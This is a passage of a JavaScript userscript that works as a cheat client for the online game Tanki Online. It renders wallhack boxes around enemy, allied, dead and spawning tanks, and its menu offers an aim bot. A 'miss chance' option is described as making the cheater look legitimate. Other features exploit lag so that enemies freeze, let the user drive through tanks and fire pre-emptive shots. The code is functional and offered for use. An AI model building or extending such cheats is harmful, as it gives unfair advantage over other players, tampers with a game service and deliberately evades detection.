                        ctx.lineWidth = 1;
                        for (const [a, b, c, d] of faces) {
                            if (!sp[a][2] || !sp[b][2] || !sp[c][2] || !sp[d][2]) continue;
                            ctx.beginPath();
                            ctx.moveTo(sp[a][0], sp[a][1]);
                            ctx.lineTo(sp[b][0], sp[b][1]);
                            ctx.lineTo(sp[c][0], sp[c][1]);
                            ctx.lineTo(sp[d][0], sp[d][1]);
                            ctx.closePath();
                            ctx.fill();
                            ctx.stroke();
                        }
                    }
                }
            }
        }

if (unsafeWindow.espCam && _camKeys && !battleEnd && tanks.length && user?.state === "active") {
    const _camProp = props.espCam.str.split(".")[3].split("(")[0];
    const cam = unsafeWindow.espCam;
    const _mySizes = user.wasp ? document.waspSize : document.hornetSize;
    const back = _mySizes[0], front = _mySizes[1], side = _mySizes[2];
    const bottom = _mySizes[4], top = _mySizes[5];
    const yaw = 2 * Math.atan2(user.body.orientations[Object.keys(user.body.orientations)[3]], user.body.orientations[Object.keys(user.body.orientations)[0]]);
    const COS = Math.cos(yaw), SIN = Math.sin(yaw);
    const BP = Object.values(user.body.pos);
    const offsetX = (front - back) / 2;
    const offsetZ = (top - bottom) / 2;
    const pts = [];
    let anyOn = false;
    for (let sx of [-1, 1]) for (let sy of [-1, 1]) for (let sz of [-1, 1]) {
        const lx = sx * side, ly = sy * (back + front) / 2 + offsetX;
        const wp = {};
        wp[_camKeys[0]] = lx * COS - ly * SIN + BP[0];
        wp[_camKeys[1]] = lx * SIN + ly * COS + BP[1];
        wp[_camKeys[2]] = sz * (bottom + top) / 2 + offsetZ + BP[2];
        const on = cam[_camProp](wp, _proj);
        if (on) anyOn = true;
        pts.push([_proj[_camKeys[0]], _proj[_camKeys[1]], on]);
    }
    if (anyOn) {
        const W = ctx.canvas.width, H = ctx.canvas.height;
        const sp = pts.map(p => [
            Math.max(-W, Math.min(W * 2, p[0])),
            Math.max(-H, Math.min(H * 2, p[1])),
            p[2]
        ]);
        const faces = [
            [0, 1, 3, 2],
            [4, 5, 7, 6],
            [0, 1, 5, 4],
            [2, 3, 7, 6],
            [0, 2, 6, 4],
            [1, 3, 7, 5],
        ];
        ctx.save();
        ctx.globalAlpha = 0.3;
        ctx.fillStyle = "rgb(100, 255, 100)";
        ctx.strokeStyle = "rgb(100, 255, 100)";
        ctx.lineWidth = 1;
        for (const [a, b, c, d] of faces) {
            if (!sp[a][2] || !sp[b][2] || !sp[c][2] || !sp[d][2]) continue;
            ctx.beginPath();
            ctx.moveTo(sp[a][0], sp[a][1]);
            ctx.lineTo(sp[b][0], sp[b][1]);
            ctx.lineTo(sp[c][0], sp[c][1]);
            ctx.lineTo(sp[d][0], sp[d][1]);
            ctx.closePath();
            ctx.fill();
            ctx.stroke();
        }
        ctx.restore();
    }
}

if (false && _hTarget && unsafeWindow.espCam && _camKeys && props?.espCam) { // red box
    const _camProp = props.espCam.str.split(".")[3].split("(")[0];
    const cam = unsafeWindow.espCam;
    const back = _hTmSizes[0], front = _hTmSizes[1], side = _hTmSizes[2];
    const bottom = _hTmSizes[4], top = _hTmSizes[5];
    const COS = Math.cos(_hBoxRot), SIN = Math.sin(_hBoxRot);
    const offsetX = (front - back) / 2, offsetZ = (top - bottom) / 2;
    const pts = [];
    let anyOn = false;
    for (let sx of [-1, 1]) for (let sy of [-1, 1]) for (let sz of [-1, 1]) {
        const lx = sx * side, ly = sy * (back + front) / 2 + offsetX;
        const wp = {};
        wp[_camKeys[0]] = lx * COS - ly * SIN + _hTarget.x;
        wp[_camKeys[1]] = lx * SIN + ly * COS + _hTarget.y;
        wp[_camKeys[2]] = sz * (bottom + top) / 2 + offsetZ + _hTarget.z;
        const on = cam[_camProp](wp, _proj);
        if (on) anyOn = true;
        pts.push([_proj[_camKeys[0]], _proj[_camKeys[1]], on]);
    }
    if (anyOn) {
        const W = ctx.canvas.width, H = ctx.canvas.height;
        const sp = pts.map(p => [Math.max(-W, Math.min(W*2, p[0])), Math.max(-H, Math.min(H*2, p[1])), p[2]]);
        const faces = [[0,1,3,2],[4,5,7,6],[0,1,5,4],[2,3,7,6],[0,2,6,4],[1,3,7,5]];
        ctx.save();
        ctx.globalAlpha = 0.3;
        ctx.fillStyle = "rgb(255, 80, 80)";
        ctx.strokeStyle = "rgb(255, 80, 80)";
        ctx.lineWidth = 1;
        for (const [a, b, c, d] of faces) {
            if (!sp[a][2] || !sp[b][2] || !sp[c][2] || !sp[d][2]) continue;
            ctx.beginPath();
            ctx.moveTo(sp[a][0], sp[a][1]);
            ctx.lineTo(sp[b][0], sp[b][1]);
            ctx.lineTo(sp[c][0], sp[c][1]);
            ctx.lineTo(sp[d][0], sp[d][1]);
            ctx.closePath();
            ctx.fill();
            ctx.stroke();
        }
        ctx.restore();
    }
}

        if (unsafeWindow.espCam && _camKeys && !battleEnd && tanks.length && window.playerSpawns?.length && props?.espCam && checked("Show Spawn [users]")) {
    const _camProp = props.espCam.str.split(".")[3].split("(")[0];
    const cam = unsafeWindow.espCam;
    const W = ctx.canvas.width, H = ctx.canvas.height;

    let _vpKey = null;
    for (const k of Object.keys(cam)) {
        const m = cam[k];
        if (!m || typeof m !== 'object') continue;
        if (typeof m[0] !== 'number' || typeof m[11] !== 'number' || typeof m[15] !== 'number') continue;
        if (Math.abs(m[11] + 1) > 0.1 && Math.abs(m[11]) > 0.1 && m[15] > 100) { _vpKey = k; break; }
    }

    const drawArrow = (cx, cy, tank) => {
        const dx = cx - W / 2, dy = cy - H / 2;
        const angle = Math.atan2(dy, dx);
        const edgePad = 40;
        const scale = Math.min((W / 2 - edgePad) / Math.abs(dx), (H / 2 - edgePad) / Math.abs(dy));
        const ax = W / 2 + dx * scale, ay = H / 2 + dy * scale;
        const arrowLen = 22, arrowWidth = 10;
        const tipX = ax + Math.cos(angle) * arrowLen, tipY = ay + Math.sin(angle) * arrowLen;
        const baseX = ax - Math.cos(angle) * arrowLen, baseY = ay - Math.sin(angle) * arrowLen;
        const perpX = -Math.sin(angle) * arrowWidth, perpY = Math.cos(angle) * arrowWidth;
        ctx.fillStyle = tank.isUser ? "rgba(40, 255, 40, 0.85)" : "rgba(127, 119, 221, 0.85)";
        ctx.strokeStyle = tank.isUser ? "rgba(40, 255, 40, 0.95)" : "rgba(175, 169, 236, 0.95)";
        ctx.lineWidth = 2;
        ctx.beginPath();
        ctx.moveTo(tipX, tipY);
        ctx.lineTo(baseX + perpX, baseY + perpY);
        ctx.lineTo(baseX - perpX, baseY - perpY);
        ctx.closePath();
        ctx.fill();
        ctx.stroke();
    };

    const drawVpArrow = (x, y, z, tank, vp) => {
        const clip_x = vp[0]*x + vp[4]*y + vp[8]*z + vp[12];
        const clip_y = vp[1]*x + vp[5]*y + vp[9]*z + vp[13];
        const clip_w = vp[3]*x + vp[7]*y + vp[11]*z + vp[15];
        if (Math.abs(clip_w) < 0.001) return false;
        const dirScale = clip_w > 0 ? 1 : -1;
        const ddx = (clip_x / clip_w) * (W / 2) * dirScale;
        const ddy = -(clip_y / clip_w) * (H / 2) * dirScale;
        if (Math.abs(ddx) < 1 && Math.abs(ddy) < 1) return false;
        drawArrow(W / 2 + ddx, H / 2 + ddy, tank);
        return true;
    };

    if (state.spawnShape === "triangle") {
        for (const entry of window.playerSpawns) {
            const tank = tanks.find(c => c.name === entry.name && !c.enemy);
            if (!tank || ["active", "semi_active"].includes(tank.state)) continue;
            const { x, y, z, rot } = entry;

            const forward = 350, back = 100, side = 100;
            const COS = Math.cos(rot + Math.PI / 2), SIN = Math.sin(rot + Math.PI / 2);

            const tipWp = {}, leftWp = {}, rightWp = {};
            tipWp[_camKeys[0]]   = x + COS * forward;         tipWp[_camKeys[1]]   = y + SIN * forward;         tipWp[_camKeys[2]]   = z;
            leftWp[_camKeys[0]]  = x - COS * back + SIN * side; leftWp[_camKeys[1]]  = y - SIN * back - COS * side; leftWp[_camKeys[2]]  = z;
            rightWp[_camKeys[0]] = x - COS * back - SIN * side; rightWp[_camKeys[1]] = y - SIN * back + COS * side; rightWp[_camKeys[2]] = z;

            const pts = [];
            let anyOn = false;
            for (const wp of [tipWp, leftWp, rightWp]) {
                const on = cam[_camProp](wp, _proj);
                if (on) anyOn = true;
                pts.push([_proj[_camKeys[0]], _proj[_camKeys[1]], on]);
            }

            if (!anyOn) {
                if (!_vpKey) continue;
                if (!drawVpArrow(x, y, z, tank, cam[_vpKey])) continue;
                continue;
            }

            const [tip, left, right] = pts;
            const cx = (tip[0] + left[0] + right[0]) / 3;
            const cy = (tip[1] + left[1] + right[1]) / 3;

            if (cx < 0 || cx > W || cy < 0 || cy > H) { drawArrow(cx, cy, tank); continue; }
            if (!tip[2] || !left[2] || !right[2]) continue;

            ctx.fillStyle = tank.isUser ? "rgba(40, 255, 40, 0.15)" : "rgba(175, 169, 236, 0.15)";
            ctx.strokeStyle = tank.isUser ? "rgba(40, 255, 40, 0.7)" : "rgba(127, 119, 221, 0.75)";
            ctx.lineWidth = 1.5;
            ctx.beginPath();
            ctx.moveTo(tip[0], tip[1]);
            ctx.lineTo(left[0], left[1]);
            ctx.lineTo(right[0], right[1]);
            ctx.closePath();
            ctx.fill();
            ctx.stroke();
        }
    } else {
        const faces = [[0,1,3,2],[4,5,7,6],[0,1,5,4],[2,3,7,6],[0,2,6,4],[1,3,7,5]];
        for (const entry of window.playerSpawns) {
            const tank = tanks.find(c => c.name === entry.name && !c.enemy);
            if (!tank || ["active", "semi_active"].includes(tank.state)) continue;
            const { x, y, z, rot } = entry;
            const COS = Math.cos(rot), SIN = Math.sin(rot);
            const pts = [];
            let anyOn = false;
            for (let sx of [-1, 1]) for (let sy of [-1, 1]) for (let sz of [-1, 1]) {
                const lx = sx * 120, ly = sy * (sy > 0 ? 320 : 120);
                const wp = {};
                wp[_camKeys[0]] = lx * COS - ly * SIN + x;
                wp[_camKeys[1]] = lx * SIN + ly * COS + y;
                wp[_camKeys[2]] = sz * 120 + z;
                const on = cam[_camProp](wp, _proj);
                if (on) anyOn = true;
                pts.push([_proj[_camKeys[0]], _proj[_camKeys[1]], on]);
            }
            if (!anyOn) {
                if (!_vpKey) continue;
                if (!drawVpArrow(x, y, z, tank, cam[_vpKey])) continue;
                continue;
            }
            const sp = pts.map(p => [Math.max(-W, Math.min(W * 2, p[0])), Math.max(-H, Math.min(H * 2, p[1])), p[2]]);
            const cx = sp.reduce((s, p) => s + p[0], 0) / sp.length;
            const cy = sp.reduce((s, p) => s + p[1], 0) / sp.length;
            if (cx < 0 || cx > W || cy < 0 || cy > H) { drawArrow(cx, cy, tank); continue; }
            ctx.fillStyle = tank.isUser ? "rgba(40, 255, 40, 0.08)" : "rgba(175, 169, 236, 0.08)";
            ctx.strokeStyle = tank.isUser ? "rgba(40, 255, 40, 0.6)" : "rgba(127, 119, 221, 0.65)";
            ctx.lineWidth = 1.5;
            for (const [a, b, c, d] of faces) {
                if (!sp[a][2] || !sp[b][2] || !sp[c][2] || !sp[d][2]) continue;
                ctx.beginPath();
                ctx.moveTo(sp[a][0], sp[a][1]);
                ctx.lineTo(sp[b][0], sp[b][1]);
                ctx.lineTo(sp[c][0], sp[c][1]);
                ctx.lineTo(sp[d][0], sp[d][1]);
                ctx.closePath();
                ctx.fill();
                ctx.stroke();
            }
        }
    }
}

        if (checked("Flag Timer")) {
            const FLAG_MS = 30000;
            const barW = 75, barH = 9, by = 14, gap = 8;
            const cx = overlay.width / 2;

            const drawFlagBar = (dropTime, color, label, bx) => {
                const elapsed = Date.now() - dropTime;
                if (elapsed > FLAG_MS) return true;
                const frac = (FLAG_MS - elapsed) / FLAG_MS;
                /*ctx.fillStyle = "rgba(0,0,0,0.6)";
                ctx.fillRect(bx - 2, by - 13, barW + 4, barH + 17);
                ctx.fillStyle = color;
                ctx.fillRect(bx, by, barW * frac, barH);
                ctx.strokeStyle = "rgba(255,255,255,0.3)";
                ctx.lineWidth = 1;
                ctx.strokeRect(bx, by, barW, barH);*/
                ctx.fillStyle = "#fff";
                ctx.font = "bold 16px Arial";
                ctx.textAlign = "center";
                //ctx.fillText(`${label} ${((FLAG_MS - elapsed) / 1000).toFixed(1)}s`, bx + barW / 2, by - 2);
                ctx.fillText(`${((FLAG_MS - elapsed) / 1000).toFixed(1)}s`, bx + barW / 2, by + 20);
                return false;
            };

            const isTeamA = user.team === 'team_a';
            const leftKey = isTeamA ? 'redFlagDropTime' : 'blueFlagDropTime';
            const rightKey = isTeamA ? 'blueFlagDropTime' : 'redFlagDropTime';

            if (unsafeWindow[leftKey]) if (drawFlagBar(unsafeWindow[leftKey], "rgb(55,110,240)", "BLU", cx - gap - barW)) unsafeWindow[leftKey] = null;
            if (unsafeWindow[rightKey]) if (drawFlagBar(unsafeWindow[rightKey], "rgb(220,55,55)", "RED", cx + gap)) unsafeWindow[rightKey] = null;
        }
    }
    draw();
})();

(async function () {
    const ImGui = window.ImGui,
          ImGui_Impl = window.ImGui_Impl;

    await ImGui.default();
    const canvas = document.createElement("canvas");
    canvas.style.position = "fixed";
    canvas.style.top = "0";
    canvas.style.left = "0";
    canvas.style.width = "100%";
    canvas.style.height = "100%";
    canvas.style.zIndex = "999999";
    canvas.style.pointerEvents = "none";
    canvas.style.background = "transparent";
    document.body.appendChild(canvas);
    const gl =
          canvas.getContext("webgl2", {
              alpha: true,
              premultipliedAlpha: false,
              antialias: true,
          }) ||
          canvas.getContext("webgl", {
              alpha: true,
              premultipliedAlpha: false,
              antialias: true,
          });
    let menuOpen = false;

    ImGui.CreateContext();

    ImGui.StyleColorsDark();

    {
        const sc = (col, r, g, b, a) => { const c = ImGui.GetStyle().Colors[col]; c.x = r; c.y = g; c.z = b; c.w = a; };
        sc(ImGui.Col.FrameBg,             0.30, 0.18, 0.06, 0.54);
        sc(ImGui.Col.FrameBgHovered,      0.60, 0.38, 0.12, 0.40);
        sc(ImGui.Col.FrameBgActive,       0.60, 0.38, 0.12, 0.67);
        sc(ImGui.Col.TitleBgActive,       0.30, 0.18, 0.06, 1.00);
        sc(ImGui.Col.CheckMark,           0.90, 0.65, 0.35, 1.00);
        sc(ImGui.Col.SliderGrab,          0.65, 0.42, 0.15, 1.00);
        sc(ImGui.Col.SliderGrabActive,    0.80, 0.52, 0.18, 1.00);
        sc(ImGui.Col.Button,              0.60, 0.38, 0.12, 0.40);
        sc(ImGui.Col.ButtonHovered,       0.60, 0.38, 0.12, 1.00);
        sc(ImGui.Col.ButtonActive,        0.45, 0.28, 0.08, 1.00);
        sc(ImGui.Col.Header,              0.60, 0.38, 0.12, 0.31);
        sc(ImGui.Col.HeaderHovered,       0.60, 0.38, 0.12, 0.80);
        sc(ImGui.Col.HeaderActive,        0.60, 0.38, 0.12, 1.00);
        sc(ImGui.Col.ResizeGrip,          0.60, 0.38, 0.12, 0.20);
        sc(ImGui.Col.ResizeGripHovered,   0.60, 0.38, 0.12, 0.67);
        sc(ImGui.Col.ResizeGripActive,    0.60, 0.38, 0.12, 0.95);
        sc(ImGui.Col.Tab,                 0.38, 0.24, 0.08, 0.86);
        sc(ImGui.Col.TabHovered,          0.60, 0.38, 0.12, 0.80);
        sc(ImGui.Col.TabActive,           0.48, 0.30, 0.10, 1.00);
    }

    const io = ImGui.GetIO();
    await new Promise((resolve) => {
        GM.xmlHttpRequest({
            method: "GET",
            url: "https://raw.githubusercontent.com/google/fonts/main/ofl/roboto/Roboto%5Bwdth%2Cwght%5D.ttf",
            responseType: "arraybuffer",
            onload: (res) => {
                try {
                    io.Fonts.AddFontFromMemoryTTF(res.response, 16.0, null, io.Fonts.GetGlyphRangesCyrillic());
                } catch(e) { log("font add failed:", e); }
                resolve();
            },
            onerror: () => { log("font fetch failed, using default"); resolve(); },
        });
    });
    ImGui_Impl.Init(gl);
    function resize() {
        const dpr = window.devicePixelRatio || 1;
        const w = window.innerWidth;
        const h = window.innerHeight;
        canvas.width = w * dpr;
        canvas.height = h * dpr;
        io.DisplaySize.x = w;
        io.DisplaySize.y = h;
        io.DisplayFramebufferScale.x = dpr;
        io.DisplayFramebufferScale.y = dpr;
    }
    window.addEventListener("resize", resize);
    resize();

    let activeBindFeature = null;
    let menuPosRestored = false;

    window.addEventListener(
        "keydown",
        function (e) {
            if(!user.verified) return
            if (activeBindFeature !== null) {
                if (e.key === "Escape") {
                    activeBindFeature = null;
                } else {
                    const n = e.key.length === 1 ? e.key.toUpperCase() : e.key;
                    binds[activeBindFeature] = { name: n, type: "keyboard", code: e.keyCode, which: null };
                    activeBindFeature = null;
                }
                e.preventDefault();
                e.stopPropagation();
                return;
            }
            if ((e.altKey && e.code === "KeyM") || e.code === "Insert") {
                menuOpen = !menuOpen;
                canvas.style.pointerEvents = menuOpen ? "auto" : "none";
                e.preventDefault();
                e.stopPropagation();
            }
        },
        true
    );

    window.addEventListener(
        "mousedown",
        function (e) {
            if (activeBindFeature !== null) {
                const mouseMap = { 0: "M1", 1: "M3", 2: "M2", 3: "M4", 4: "M5" };
                const whichMap  = { 0: 1,    1: 2,    2: 3,    3: 4,    4: 5   };
                const selectedName = mouseMap[e.button] || `M${e.button + 1}`;
                const which = whichMap[e.button] ?? (e.button + 1);

                binds[activeBindFeature] = { name: selectedName, type: "mouse", code: null, which };
                activeBindFeature = null;

                e.preventDefault();
                e.stopPropagation();
            }
        },
        true
    );

    window.addEventListener(
        "wheel",
        function (e) {
            if (activeBindFeature !== null) {
                const scrollName = e.deltaY < 0 ? "MWheelUp" : "MWheelDown";

                binds[activeBindFeature] = { name: scrollName, type: "scroll", code: null, which: null };
                activeBindFeature = null;

                e.preventDefault();
                e.stopPropagation();
            }
        },
        { passive: false, capture: true }
    );

    let currentTab = 0;

    const TRU = {
        tabMain:        "Главная",
        tabRadar:       "Радар",
        tabTexture:     "Текстуры",
        tabRailgun:     "Рельса",
        tabKeybinds:    "Клавиши",
        fov:            "Обзор",
        fovTip:         "Настроить поле зрения",
        cleanScreen:    "Чистый экран",
        cleanScreenTip: "Скрывает интерфейс с экрана",
        removeExp:      "Удаляет дым",
        removeExpTip:   "Удаляет дым от гибели танка",
        flagTimer:      "Таймер флага",
        flagTimerTip:   "Показывает время до автоматического возврата флага на базу",
        removeBushes:   "Удаляет кусты",
        removeBushesTip:"Удаляет всю растительность с карт. Для корректной работы необходимо установить минимальное значение в Настройки → Графика → Качество деревьев → Спрайты",
        deadBox:        "Отображает 3D текстуру",
        deadBoxTip:     "Отображает 3D текстуру ржавого танка на картах Зона/Станция",
        showSpawn:      "показывать респаун (пользователя)",
        showSpawnTip:   "Показывает, где тимейт будет появляться (у тимейта тоже должен быть установлен скрипт)",
        lagComp:        "Исправляет задержку при выстреле",
        lagCompTip:     `Оптимизирует работу функций "предсказание и безопасный выстрел", при высоком пинге`,
        enemy:          "Противники",
        enemyTip:       "Отображает противников сквозь стены",
        team:           "Союзники",
        teamTip:        "Отображает союзников сквозь стены",
        dead:           "Мёртвые",
        deadTip:        "Отображает мёртвые танки сквозь стены",
        ghost:          "Призраки",
        ghostTip:       "Отображает спавнящиеся танки сквозь стены",
        legacyTip:      "Устанавливает скины Legacy",
        xtTip:          "Устанавливает скины XT",
        aimBot:         "АвтоНаводка",
        aimBotTip:      `Усовершенствованная АвтоНаводка на вражеские танки с технологиями "ИИ"`,
        missChance:     "Шанс промаха",
        missChanceTip:  "Добавляет шанс промаха к АвтоНаводке, делая вас менее подозрительным",
        bindNone:       "[ Нет ]",
        radarOffset:    125,
        railgunOffset:  160,
        keybindOffset:  195,
        predict:        "Предсказание",
        predictDesc:    "По назначенной спец клавише Предсказание предугадывает выстрел противника на 1 раз (для корректной работы спец клавишу следует нажимать перед каждым выстрелом противника), что даёт преимущество выстрелить первым в большинстве сценариев",
        highPing:       "Выстрел при лаге",
        highPingDesc:   "Нажмите перед выстрелом. Враг замирает на 0.7с.",
        ignoreTanks:    "Игнор танков",
        ignoreTanksDesc:"Удерживайте кнопку чтобы проехать сквозь все танки.",
        safeShot:       "Безопасный выстрел",
        safeShotDesc:   "Удерживайте для Выстрела в момент когда противник выходит из инвиза.",
        preShot:        "Ранний выстрел",
        preShotDesc:    "Удерживайте для Выстрела при раннем спавне противника ИЛИ до окончания перезарядки противника.",
    };
    const TEN = {
        tabMain:        "Main",
        tabRadar:       "Radar",
        tabTexture:     "Texture",
        tabRailgun:     "Railgun",
        tabKeybinds:    "Keybinds",
        fov:            "FOV",
        fovTip:         "Adjust Field of View",
        cleanScreen:    "Clean Screen",
        cleanScreenTip: "Remove all the trash from screen",
        removeExp:      "Remove Explosion",
        removeExpTip:   "Remove Explosion from death of tank",
        flagTimer:      "Flag Timer",
        flagTimerTip:   "Display time in seconds at the top, when the flag is going to be returned back to the base",
        removeBushes:   "Remove Bushes",
        removeBushesTip:"Remove bushes from all maps. For it to work set in Tanki Online settings Graphics - Quality Of Trees to the lowest",
        deadBox:        "Dead Box [zone/station]",
        deadBoxTip:     "Draw a 3d square on top of dead tank in zone to understand it better",
        showSpawn:      "Show Spawn [users]",
        showSpawnTip:   "Shows where teammate will respawn (teammate has to use the script)",
        lagComp:        "Lag Compensation",
        lagCompTip:     "Enable only if your ping is high or unstable, test different ms, the lower the ms the better.",
        enemy:          "Enemy",
        enemyTip:       "See enemies through walls",
        team:           "Team",
        teamTip:        "See teammates through walls",
        dead:           "Dead",
        deadTip:        "See dead tanks through walls",
        ghost:          "Ghost",
        ghostTip:       "See spawning tanks through walls",
        legacyTip:      "Replace hull/turret textures with Legacy skins",
        xtTip:          "Replace hull/turret textures with XT skins",
        aimBot:         "Aim Bot",
        aimBotTip:      "Rotates your turret on the enemy, unlike the obvious aim assist it aims not on the nearest pixel, but on the middle, shoots through middles of gaps. Prioritises enemies with flags and aims for double kills",
        missChance:     "Miss Chance",
        missChanceTip:  "Adds a missing chance to the aim bot, making you look more legit",
        bindNone:       "[ None ]",
        radarOffset:    80,
        railgunOffset:  115,
        keybindOffset:  120,
        predict:        "Predict",
        predictDesc:    "Click before shot. When enemy fires railgun, you fire first.",
        highPing:       "High Ping Shot",
        highPingDesc:   "Click before shot. Enemy freezes in place for 0.7s.",
        ignoreTanks:    "Ignore Tanks",
        ignoreTanksDesc:"Hold to drive through all tanks.",
        safeShot:       "Safe Shot",
        safeShotDesc:   "Hold. Fires when enemy finishes spawning.",
        preShot:        "Pre Shot",
        preShotDesc:    "Hold. Fires on early enemy spawn or before enemy finishes reloading.",
    };

    const tooltip = (text) => {
        if (!ImGui.IsItemHovered()) return;
        ImGui.BeginTooltip();
        ImGui.PushTextWrapPos(ImGui.GetFontSize() * 22.0);
        ImGui.TextUnformatted(text);
        ImGui.PopTextWrapPos();
        ImGui.EndTooltip();
    };

    const clamp = (v, lo, hi) => Math.min(hi, Math.max(lo, v));
    function frame(time) {
        const T = RU ? TRU : TEN;
        window.bonusSpeed = state.lagComp ? state.lagCompValue : 0;
        ImGui_Impl.NewFrame(time);
        ImGui.NewFrame();
        if (menuOpen && user.verified) {
            ImGui.SetNextWindowSize(new ImGui.ImVec2(360, 240), ImGui.Cond.FirstUseEver);
            if (!menuPosRestored && state.menuX !== null) {
                ImGui.SetNextWindowPos(new ImGui.ImVec2(state.menuX, state.menuY));
                menuPosRestored = true;
            }
            ImGui.Begin("Coffee Script", null, ImGui.WindowFlags.NoCollapse);

            if (ImGui.Button(T.tabMain,     new ImGui.ImVec2(0, 22))) currentTab = 0;
            ImGui.SameLine();
            if (ImGui.Button(T.tabRadar,    new ImGui.ImVec2(0, 22))) currentTab = 1;
            ImGui.SameLine();
            if (ImGui.Button(T.tabTexture,  new ImGui.ImVec2(0, 22))) currentTab = 2;
            ImGui.SameLine();
            if (ImGui.Button(T.tabRailgun,  new ImGui.ImVec2(0, 22))) currentTab = 3;
            ImGui.SameLine();
            if (ImGui.Button(T.tabKeybinds, new ImGui.ImVec2(0, 22))) currentTab = 4;

            ImGui.Separator();
            ImGui.Spacing();

            if (currentTab === 0) {
                ImGui.Checkbox(T.fov, (v = state.fovEnabled) => (state.fovEnabled = v));
                tooltip(T.fovTip);
                ImGui.SameLine();
                ImGui.SetNextItemWidth(110);
                let fovStep = Math.round(state.fovValue / 0.05);
                ImGui.SliderInt("##fov", (v = fovStep) => (fovStep = v), 20, 40, "");
                state.fovValue = clamp(fovStep * 0.05, 1.0, 2.0);
                ImGui.SameLine();
                ImGui.Text(state.fovValue.toFixed(2));

                ImGui.Spacing();

                ImGui.Checkbox(T.cleanScreen, (v = state.cleanScreen) => (state.cleanScreen = v));
                tooltip(T.cleanScreenTip);
                ImGui.Checkbox(T.removeExp, (v = state.removeExplosion) => (state.removeExplosion = v));
                tooltip(T.removeExpTip);
                ImGui.Checkbox(T.flagTimer, (v = state.flagTimer) => (state.flagTimer = v));
                tooltip(T.flagTimerTip);
                ImGui.Checkbox(T.removeBushes, (v = state.removeBushes) => (state.removeBushes = v));
                tooltip(T.removeBushesTip);
                ImGui.Checkbox(T.deadBox, (v = state.deadBox) => (state.deadBox = v));
                tooltip(T.deadBoxTip);
                ImGui.Checkbox(T.showSpawn, (v = state.showSpawn) => (state.showSpawn = v));
                tooltip(T.showSpawnTip);
                if (state.showSpawn) {
                    ImGui.SameLine();
                    if (ImGui.RadioButton("Triangle", state.spawnShape === "triangle")) state.spawnShape = "triangle";
                    ImGui.SameLine();
                    if (ImGui.RadioButton("Square", state.spawnShape === "square")) state.spawnShape = "square";
                }

                ImGui.Spacing();

                ImGui.Checkbox(T.lagComp, (v = state.lagComp) => (state.lagComp = v));
                tooltip(T.lagCompTip);
                ImGui.SetNextItemWidth(150);
                ImGui.SliderInt("##lagcomp", (v = state.lagCompValue) => (state.lagCompValue = clamp(v, 0, 400)), 0, 400, "%dms");
                ImGui.SameLine();
                if (ImGui.SmallButton("-##lag")) state.lagCompValue = clamp(state.lagCompValue - 10, 0, 400);
                ImGui.SameLine();
                if (ImGui.SmallButton("+##lag")) state.lagCompValue = clamp(state.lagCompValue + 10, 0, 400);
            }

            else if (currentTab === 1) {
                const colorFlags = ImGui.ColorEditFlags.NoInputs;

                ImGui.Checkbox(T.enemy, (v = state.enemyWh) => (state.enemyWh = v));
                tooltip(T.enemyTip);
                ImGui.SameLine(T.radarOffset);
                ImGui.ColorEdit3("##EnemyColor", state.enemyColor, colorFlags);

                ImGui.Checkbox(T.team, (v = state.teamWh) => (state.teamWh = v));
                tooltip(T.teamTip);
                ImGui.SameLine(T.radarOffset);
                ImGui.ColorEdit3("##TeamColor", state.teamColor, colorFlags);

                ImGui.Checkbox(T.dead, (v = state.deadWh) => (state.deadWh = v));
                tooltip(T.deadTip);
                ImGui.SameLine(T.radarOffset);
                ImGui.ColorEdit3("##DeadColor", state.deadColor, colorFlags);

                ImGui.Checkbox(T.ghost, (v = state.ghostWh) => (state.ghostWh = v));
                tooltip(T.ghostTip);
                ImGui.SameLine(T.radarOffset);
                ImGui.ColorEdit3("##GhostColor", state.ghostColor, colorFlags);
            }

            else if (currentTab === 2) {
                ImGui.Checkbox("Legacy", function(v = state.legacy) { if (arguments.length) { state.legacy = v; if (v) state.xt = false; } return state.legacy; });
                tooltip(T.legacyTip);
                ImGui.Checkbox("XT", function(v = state.xt) { if (arguments.length) { state.xt = v; if (v) state.legacy = false; } return state.xt; });
                tooltip(T.xtTip);
            }

            else if (currentTab === 3) {
                ImGui.Checkbox(T.aimBot, (v = state.aimBot) => (state.aimBot = v));
                tooltip(T.aimBotTip);
                ImGui.SameLine(T.railgunOffset);
                ImGui.SetNextItemWidth(110);
                ImGui.SliderInt("##aimbot", (v = state.aimBotValue) => (state.aimBotValue = clamp(v, 1, 360)), 1, 360, "%d\u00B0");
                ImGui.SameLine();
                if (ImGui.SmallButton("-##aim")) state.aimBotValue = clamp(state.aimBotValue - 1, 1, 360);
                ImGui.SameLine();
                if (ImGui.SmallButton("+##aim")) state.aimBotValue = clamp(state.aimBotValue + 1, 1, 360);

                ImGui.Spacing();

                ImGui.Checkbox(T.missChance, (v = state.missChanceEnabled) => (state.missChanceEnabled = v));
                tooltip(T.missChanceTip);
                ImGui.SameLine(T.railgunOffset);
                ImGui.SetNextItemWidth(110);
                ImGui.SliderInt("##misschance", (v = state.missChanceValue) => (state.missChanceValue = clamp(v, 1, 99)), 1, 99, "%d%%");
            }

            else if (currentTab === 4) {
                const drawBindRow = (label, featureKey, desc) => {
                    ImGui.Text(label);
                    tooltip(desc);
                    ImGui.SameLine(T.keybindOffset);

                    const b = binds[featureKey];
                    let displayLabel = b ? `[ ${b.name} ]` : T.bindNone;
                    if (activeBindFeature === featureKey) displayLabel = "[ ... ]";

                    if (ImGui.Button(`${displayLabel}##bind${featureKey}`, new ImGui.ImVec2(90, 18))) {
                        activeBindFeature = featureKey;
                    }
                    tooltip(desc);
                };

                drawBindRow(T.predict,     "predict",     T.predictDesc);
                drawBindRow(T.highPing,    "highPing",    T.highPingDesc);
                drawBindRow(T.ignoreTanks, "ignoreTanks", T.ignoreTanksDesc);
                drawBindRow(T.safeShot,    "safeShot",    T.safeShotDesc);
                drawBindRow(T.preShot,     "preShot",     T.preShotDesc);
            }

            const wpos = ImGui.GetWindowPos();
            state.menuX = wpos.x;
            state.menuY = wpos.y;

            ImGui.End();
        }
        ImGui.EndFrame();
        ImGui.Render();
        gl.viewport(0, 0, canvas.width, canvas.height);
        gl.clearColor(0, 0, 0, 0);
        gl.clear(gl.COLOR_BUFFER_BIT);
        if (menuOpen) {
            ImGui_Impl.RenderDrawData(ImGui.GetDrawData());
        }
        window.requestAnimationFrame(frame);
    }
    window.requestAnimationFrame(frame);
})();

(function () {
    "use strict";

    const skinMap = {
        "574/111243/33/322": { type: "hulls", name: "wasp" },
        "567/105205/202/122": { type: "turrets", name: "railgun", noMeta: true },
        "566/70102/323/346":  { type: "hulls", name: "hornet" }
    };

    const GITHUB_RAW = "https://raw.githubusercontent.com/wealthydev/TankiTextures/main";
